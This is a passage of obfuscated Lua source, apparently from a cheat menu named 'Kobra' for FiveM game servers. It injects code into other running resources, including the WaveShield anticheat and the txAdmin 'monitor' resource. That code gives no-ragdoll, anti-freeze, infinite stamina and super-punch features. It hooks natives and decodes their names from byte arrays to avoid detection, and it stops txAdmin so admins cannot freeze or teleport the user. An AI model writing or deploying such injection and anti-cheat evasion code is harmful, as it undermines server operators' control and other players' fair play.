                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",5600 -2600 );end elseif v363 then local v774=0 + 0 ;while true do if (v774==(0 -0)) then v12:Notify("success","Kobra","No Ragdoll Disabled",9617 -6617 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);break;end end else local v775=0 -0 ;while true do if (v775==(0 -0)) then v48(v364,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",3000);break;end end end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v365) local v366=GetResourceState("WaveShield")=="started" ;local v367=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v365 then if v366 then local v776=0 -0 ;while true do if (v776==(1589 -(877 + 712))) then v12:Notify("success","Kobra","Anti-Freeze Enabled",1797 + 1203 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);break;end end else local v777=754 -(242 + 512) ;while true do if (v777==(0 -0)) then v48(v367,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",3000);break;end end end elseif v366 then v12:Notify("error","Kobra","Anti-Freeze Disabled",3627 -(92 + 535) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);else local v778=0;while true do if ((0 + 0)==v778) then v48(v367,[[
                                            antiFreezeEnabled = false
                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",6179 -3179 );break;end end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v368) if v368 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v369) if v369 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v370) if v370 then local v582=0;while true do if (v582==(0 + 0)) then v12:Notify("success","Kobra","Infinite Stamina On",421 + 2579 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end break;end end else local v583=0 -0 ;while true do if (v583==0) then v12:Notify("error","Kobra","Infinite Stamina Off",4572 -1572 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end break;end end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v371) local v372=1785 -(1476 + 309) ;local v373;while true do if (v372==(1284 -(299 + 985))) then v373=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v371 then v48(v373,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v48(v373,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end break;end end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v374) local v375=GetResourceState("WaveShield")=="started" ;local v376=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v374 then if v375 then local v779=0 -0 ;while true do if (v779==(93 -(86 + 7))) then v12:Notify("success","Kobra","Super Punch Enabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);break;end end else local v780=0;while true do if (v780==0) then v48(v376,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",12260 -9260 );break;end end end elseif v375 then local v781=0 + 0 ;while true do if (v781==(880 -(672 + 208))) then v12:Notify("error","Kobra","Super Punch Disabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);break;end end else local v782=0 + 0 ;while true do if (v782==0) then v48(v376,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",3132 -(14 + 118) );break;end end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v377) if v377 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v378) if v378 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(1398 -(440 + 955) ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(3,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v379) if v379 then local v584=0 + 0 ;while true do if (v584==(0 -0)) then MachoResourceStop("monitor");print("started");break;end end else local v585=0 + 0 ;while true do if (0==v585) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v380) if v380 then local v586=0;while true do if (v586==(0 + 0)) then MachoResourceStop("monitor");print("started");break;end end else local v587=353 -(260 + 93) ;while true do if (v587==0) then print("stopped");MachoResourceStart("monitor");break;end end end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v381) if v381 then MachoResourceStop("monitor");print("started");else local v588=0;while true do if (v588==0) then print("stopped");MachoResourceStart("monitor");break;end end end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1975 -(1181 + 793) ,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v382) if (v382=="Random") then v48("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=811 -(352 + 458) ,values={"Freemode Male","Freemode Female"},onSelect=function(v383) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v383));end},{type="scrollable",label="Peds",scrollType="onEnter",value=1 + 0 ,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v384) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
